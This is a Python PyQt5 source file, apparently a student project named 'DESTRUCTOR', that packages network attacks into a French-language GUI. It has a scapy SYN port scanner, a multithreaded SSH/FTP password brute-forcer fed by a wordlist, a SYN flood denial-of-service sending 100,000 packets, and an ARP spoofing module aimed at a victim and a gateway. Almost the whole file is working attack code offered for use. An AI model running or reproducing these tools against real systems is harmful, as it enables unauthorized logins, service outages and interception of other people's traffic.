import sys
import PyQt5
import paramiko
from ftplib import FTP, error_perm
import concurrent.futures
from concurrent.futures import ThreadPoolExecutor
import time
import threading

from PyQt5.QtWidgets import (
    QApplication,
    QMainWindow,
    QPushButton,
    QVBoxLayout,
    QLabel,
    QWidget,
    QMessageBox,
    QSizePolicy,
    QSpacerItem,
    QLineEdit,
    QFileDialog,
    QHBoxLayout,
)
from PyQt5.QtCore import Qt
from scapy.all import IP, TCP, sr1, send, Ether, ARP, getmacbyip, sendp


class PortScanWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Scan de Port")
        self.setGeometry(150, 150, 400, 400)
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()

        self.ip_input = QLineEdit(self)
        self.ip_input.setPlaceholderText("Entrez l'adresse IP")
        layout.addWidget(self.ip_input)

        label = QLabel("Sélectionnez les ports à scanner :")
        layout.addWidget(label)

        self.port_buttons = {
            "HTTP (80)": 80,
            "HTTPS (443)": 443,
            "FTP (21)": 21,
            "SSH (22)": 22,
            "Telnet (23)": 23,
            "SMTP (25)": 25,
            "DNS (53)": 53,
            "POP3 (110)": 110,
            "IMAP (143)": 143,
            "MySQL (3306)": 3306,
            "RDP (3389)": 3389,
        }

        self.selected_ports = []

        # Création des boutons
        for port_name, port_number in self.port_buttons.items():
            button = QPushButton(port_name)
            button.setCheckable(True)
            button.setStyleSheet("background-color: lightgray;")
            button.clicked.connect(lambda checked, port=port_number, btn=button: self.toggle_port_selection(port, btn))
            layout.addWidget(button)

        btn_scan = QPushButton("Scanner les ports sélectionnés")
        btn_scan.clicked.connect(self.scan_selected_ports)
        layout.addWidget(btn_scan)

        self.setLayout(layout)

    def toggle_port_selection(self, port, button):
        if button.isChecked():
            if port not in self.selected_ports:
                self.selected_ports.append(port)
        else:
            if port in self.selected_ports:
                self.selected_ports.remove(port)

    def scan_selected_ports(self):
        target = self.ip_input.text()
        if not target:
            QMessageBox.warning(self, "Erreur", "Veuillez entrer une adresse IP.")
            return

        if not self.selected_ports:
            QMessageBox.warning(self, "Erreur", "Veuillez sélectionner au moins un port.")
            return

        results = []
        print(f"Début du scan des ports pour l'adresse IP {target}.")  # Message de début
        for port in self.selected_ports:
            print(f"Scan du port {port} en cours...")  # Indiquer le port en cours de scan
            pkt = IP(dst=target) / TCP(dport=port, flags="S")
            try:
                resp = sr1(pkt, timeout=1, verbose=0)

                if resp is not None:
                    if resp.haslayer(TCP) and (resp[TCP].flags == "SA"):
                        results.append(f"Port {port} est ouvert.")
                    elif resp.haslayer(TCP) and (resp[TCP].flags == "RA"):
                        results.append(f"Port {port} est fermé.")
                else:
                    results.append(f"Port {port} ne répond pas.")
            except Exception as e:
                results.append(f"Erreur lors du scan du port {port}: {str(e)}")
        print("Scan terminé.")  # Message de fin

        result_message = "\n".join(results)
        QMessageBox.information(self, "Résultats", result_message)


class BruteForceWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Brute Force SSH/FTP")
        self.setGeometry(150, 150, 400, 300)
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()

        # Section pour entrer une adresse IP
        ip_layout = QHBoxLayout()
        self.ip_input = QLineEdit(self)
        self.ip_input.setPlaceholderText("Entrez l'adresse IP cible")
        ip_layout.addWidget(QLabel("Adresse IP :"))
        ip_layout.addWidget(self.ip_input)

        layout.addLayout(ip_layout)

        # Section pour sélectionner un port
        port_layout = QHBoxLayout()
        self.port_input = QLineEdit(self)
        self.port_input.setPlaceholderText("Sélectionner le bouton SSH ou FTP")
        port_layout.addWidget(QLabel("Port :"))
        port_layout.addWidget(self.port_input)

        layout.addLayout(port_layout)

        # Boutons pour SSH et FTP
        protocol_layout = QHBoxLayout()
        ssh_button = QPushButton("SSH (22)", self)
        ssh_button.clicked.connect(lambda: self.set_port(22))
        protocol_layout.addWidget(ssh_button)

        ftp_button = QPushButton("FTP (21)", self)
        ftp_button.clicked.connect(lambda: self.set_port(21))
        protocol_layout.addWidget(ftp_button)

        layout.addLayout(protocol_layout)

        # Champ pour l'utilisateur
        self.user_input = QLineEdit(self)
        self.user_input.setPlaceholderText("Entrez l'utilisateur")
        layout.addWidget(self.user_input)

        # Champ pour le fichier de mots de passe
        self.password_file_input = QLineEdit(self)
        self.password_file_input.setPlaceholderText("Parcourir pour le fichier de mots de passe")
        self.password_file_input.setReadOnly(True)
        layout.addWidget(self.password_file_input)

        # Bouton pour parcourir les fichiers de mots de passe
        btn_browse_passwords = QPushButton("Parcourir", self)
        btn_browse_passwords.clicked.connect(self.browse_passwords)
        layout.addWidget(btn_browse_passwords)

        # Bouton pour exécuter le brute force
        self.btn_execute_bruteforce = QPushButton("Exécuter Bruteforce", self)
        self.btn_execute_bruteforce.clicked.connect(self.run_brute_force)
        layout.addWidget(self.btn_execute_bruteforce)

        self.setLayout(layout)

    def set_port(self, port):
        self.port_input.setText(str(port))

    def browse_passwords(self):
        options = QFileDialog.Options()
        password_file, _ = QFileDialog.getOpenFileName(
            self, "Sélectionner un fichier de mots de passe", "", "Text Files (*.txt);;All Files (*)", options=options
        )
        if password_file:
            self.password_file_input.setText(password_file)

    def run_brute_force(self):
        ip = self.ip_input.text()
        port = self.port_input.text() or "22"  # Port par défaut : 22
        user = self.user_input.text()
        password_file = self.password_file_input.text()

        # Validation des entrées
        if not ip or not port or not user or not password_file:
            QMessageBox.warning(self, "Erreur", "Veuillez remplir tous les champs.")
            return

        try:
            port = int(port)
        except ValueError:
            QMessageBox.warning(self, "Erreur", "Le port doit être un nombre valide.")
            return

        try:
            with open(password_file, 'r') as file:
                passwords = file.readlines()

            with ThreadPoolExecutor(max_workers=10) as executor:
                futures = {
                    executor.submit(self.attempt_connection, ip, port, user, password.strip()): password.strip() 
                    for password in passwords
                }

                for future in futures:
                    try:
                        result = future.result()
                        if result:
                            QMessageBox.information(
                                self, "Succès", f"Connexion réussie avec {user}:{result} sur {ip}:{port}"
                            )
                            return
                    except Exception as e:
                        print(f"Erreur lors de la tentative de connexion : {str(e)}")

            print("Aucun mot de passe valide trouvé.")
            QMessageBox.information(self, "Échec", "Aucun mot de passe valide trouvé.")

        except FileNotFoundError:
            QMessageBox.warning(self, "Erreur", "Le fichier de mots de passe n'a pas été trouvé.")
        except Exception as e:
            QMessageBox.warning(self, "Erreur", f"Une erreur est survenue : {str(e)}")

    def attempt_connection(self, ip, port, user, password):
        if port == 22:
            if self.ssh_brute_force(ip, port, user, password):
                return password
        elif port == 21:
            if self.ftp_brute_force(ip, port, user, password):
                return password
        return None

    def ssh_brute_force(self, ip, port, user, password):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(hostname=ip, port=port, username=user, password=password, timeout=5)
            client.close()
            return True
        except paramiko.AuthenticationException:
            print(f"Échec d'authentification avec {user}:{password}")
            return False
        except paramiko.SSHException as e:
            print(f"Erreur SSH : {str(e)}")
            return False
        except Exception as e:
            print(f"Erreur de connexion : {str(e)}")
            return False

    def ftp_brute_force(self, ip, port, user, password):
        try:
            ftp = FTP()
            ftp.connect(ip, port, timeout=5)
            ftp.login(user, password)
            ftp.quit()
            return True
        except error_perm:
            print(f"Échec d'authentification avec {user}:{password} sur FTP")
            return False
        except Exception as e:
            print(f"Erreur de connexion FTP : {str(e)}")
            return False

class DoSWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("DoS Attack")
        self.setGeometry(150, 150, 400, 400)
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()

        self.target_input = QLineEdit(self)
        self.target_input.setPlaceholderText("Entrez l'adresse IP cible")
        layout.addWidget(self.target_input)

        self.btn_execute_dos = QPushButton("Exécuter DoS")
        self.btn_execute_dos.clicked.connect(self.execute_dos)
        layout.addWidget(self.btn_execute_dos)

        self.setLayout(layout)

    def send_packet(self, target):
        pkt = IP(dst=target) / TCP(dport=80, flags="S")
        send(pkt, verbose=0)

    def execute_dos(self):
        target = self.target_input.text()
        if not target:
            QMessageBox.warning(self, "Erreur", "Veuillez entrer une adresse IP cible.")
            return

        # Logique DoS 
        try:
            start_time = time.time()  # Mesurer le temps d'exécution
            with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:  # Ajuster le nombre de threads
                futures = [executor.submit(self.send_packet, target) for _ in range(100000)]
                for future in concurrent.futures.as_completed(futures):
                    pass  # Just wait for the threads to finish

            elapsed_time = time.time() - start_time
            QMessageBox.information(self, "DoS", f"DoS envoyé vers {target}.\nTemps écoulé : {elapsed_time:.2f} secondes.")
        except Exception as e:
            QMessageBox.warning(self, "Erreur", f"Erreur lors de l'exécution du DoS : {str(e)}")


class ARPSpoofingWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("ARP Spoofing")
        self.setGeometry(150, 150, 400, 400)
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()

        self.target_ip_input = QLineEdit(self)
        self.target_ip_input.setPlaceholderText("Entrez l'adresse IP de la victime")
        layout.addWidget(self.target_ip_input)

        self.gateway_ip_input = QLineEdit(self)
        self.gateway_ip_input.setPlaceholderText("Entrez l'adresse IP de la passerelle")
        layout.addWidget(self.gateway_ip_input)

        self.btn_execute_arp_spoofing = QPushButton("Exécuter ARP Spoofing")
        self.btn_execute_arp_spoofing.clicked.connect(self.execute_arp_spoofing)
        layout.addWidget(self.btn_execute_arp_spoofing)

        self.setLayout(layout)

    def execute_arp_spoofing(self):
        target_ip = self.target_ip_input.text()
        gateway_ip = self.gateway_ip_input.text()
        if not target_ip or not gateway_ip:
            QMessageBox.warning(self, "Erreur", "Veuillez entrer les adresses IP.")
            return

        try:
            target_mac = getmacbyip(target_ip)
            gateway_mac = getmacbyip(gateway_ip)

            arp_poisoning_target = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwsrc=target_mac)
            arp_poisoning_gateway = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwsrc=target_mac)

            sendp(arp_poisoning_target, verbose=0)
            sendp(arp_poisoning_gateway, verbose=0)

            QMessageBox.information(self, "ARP Spoofing", "ARP Spoofing exécuté.")
            
            self.reset_arp_cache(target_ip, target_mac, gateway_ip, gateway_mac)
            QMessageBox.information(self, "ARP Spoofing", "Tables ARP restaurées.")
        except Exception as e:
            QMessageBox.warning(self, "Erreur", f"Erreur lors de l'exécution de l'ARP Spoofing : {str(e)}")

    def reset_arp_cache(self, victim_ip, victim_mac, gateway_ip, gateway_mac):

        try:
            restore_victim = ARP(op=2, psrc=gateway_ip, pdst=victim_ip, hwsrc=gateway_mac, hwdst=victim_mac)
            restore_gateway = ARP(op=2, psrc=victim_ip, pdst=gateway_ip, hwsrc=victim_mac, hwdst=gateway_mac)

            send(restore_victim, count=3, verbose=0)
            send(restore_gateway, count=3, verbose=0)
        except Exception as e:
            QMessageBox.warning(self, "Erreur", f"Erreur lors de la restauration des tables ARP : {str(e)}")


class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("DESTRUCTOR - V1")
        self.setGeometry(150, 150, 400, 400)
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()

        layout.setContentsMargins(20, 20, 20, 20) 

        app_name_label = QLabel("DESTRUCTOR") 
        app_name_label.setAlignment(Qt.AlignCenter)
        app_name_label.setStyleSheet("font-family: 'Courier New'; font-size: 24px; color: red; font-weight: bold;") 
        layout.addWidget(app_name_label)

        layout.addSpacing(20)

        btn_port_scan = QPushButton("Scan de Port", self)
        btn_port_scan.clicked.connect(self.open_port_scan)
        layout.addWidget(btn_port_scan)

        btn_brute_force = QPushButton("Brute Force", self)
        btn_brute_force.clicked.connect(self.open_brute_force)
        layout.addWidget(btn_brute_force)

        btn_dos = QPushButton("DoS", self)
        btn_dos.clicked.connect(self.open_dos)
        layout.addWidget(btn_dos)

        btn_arp_spoofing = QPushButton("ARP Spoofing", self)
        btn_arp_spoofing.clicked.connect(self.open_arp_spoofing)
        layout.addWidget(btn_arp_spoofing)

        btn_execute_all = QPushButton("Déployer toutes les fonctionnalités", self)
        btn_execute_all.clicked.connect(self.execute_all)
        layout.addWidget(btn_execute_all)

        layout.addSpacing(20)

        creators_label = QLabel("MADE BY : TP - ES - LU")
        creators_label.setAlignment(Qt.AlignCenter)
        creators_label.setStyleSheet("font-family: 'Courier New'; font-size: 14px; color: black; font-weight: bold;") 
        layout.addWidget(creators_label)

        spacer = QSpacerItem(20, 40, QSizePolicy.Minimum, QSizePolicy.Expanding)
        layout.addItem(spacer)

        container = QWidget()
        container.setLayout(layout)
        self.setCentralWidget(container)
        self.adjustSize()

    def open_port_scan(self):
        self.port_scan_window = PortScanWindow()
        self.port_scan_window.show()

    def open_brute_force(self):
        self.brute_force_window = BruteForceWindow()
        self.brute_force_window.show()

    def open_dos(self):
        self.dos_window = DoSWindow()
        self.dos_window.show()

    def open_arp_spoofing(self):
        self.arp_spoofing_window = ARPSpoofingWindow()
        self.arp_spoofing_window.show()

    def execute_all(self):
        self.port_scan_window = PortScanWindow()
        self.port_scan_window.show()
        self.brute_force_window = BruteForceWindow()
        self.brute_force_window.show()
        self.dos_window = DoSWindow()
        self.dos_window.show()
        self.arp_spoofing_window = ARPSpoofingWindow()
        self.arp_spoofing_window.show()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    main_win = MainWindow()
    main_win.show()
    sys.exit(app.exec_())
